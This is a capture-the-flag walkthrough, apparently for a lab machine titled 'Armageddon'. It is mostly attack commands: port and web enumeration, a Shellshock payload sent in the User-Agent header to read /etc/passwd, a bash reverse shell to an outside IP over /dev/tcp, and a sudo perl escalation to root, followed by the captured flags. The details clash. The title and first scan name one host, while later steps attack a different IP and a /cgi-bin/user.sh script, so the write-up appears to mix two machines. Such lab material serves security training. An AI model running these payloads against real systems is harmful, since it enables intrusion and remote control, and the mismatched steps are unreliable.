# Armageddon 

>  Easy | Linux 

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 -p- 10.10.10.233` 
	- `sudo nmap -T4 -A -p 80,2222 10.10.10.233` 
2. enumerate port 22:
	- try anonymous connection - failed
	- read banner = OpenSSH 7.4
3. enumerate port 80:
	- visit website `http://10.10.10.233`
	- run gobuster: `gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,conf,txt,js,php`
	- check for robots.txt - none 
	- run nikto scan: `nikto -h 10.10.10.56`
	- run gobuster again: `gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
	- try "cgi-bin" directory for files: `gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,conf,txt,js,php,sh`
		- found "user.sh"
	- test for shellshock vulnerability (Linux host with script in /cgi-bin):
		- `sudo nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56 -p 80`
		- target is vulnerable 
	- try to execute commands:
		- `wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh && cat user.sh`
		- success 
	- create a web shell:
		- `wget -U "() { foo;};echo; /bin/bash -i >& /dev/tcp/10.10.14.135/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh`
4. get user flag
	- `cd ~` -> `cat user.txt`
	- user flag = **ead141c08df151d44c73953169776c62**
5. escalate privileges
	- check sudo permissions: `sudo -l` -- have root access to /usr/bin/perl 
	- lookup on GTFO Bins -- found exploit: `sudo perl -e 'exec "/bin/sh";'`
	- get root flag:
		- `cat /root/root.txt`
		- root flag = **25d793a4e484b3e51d16f0be17b99e98**
	
	
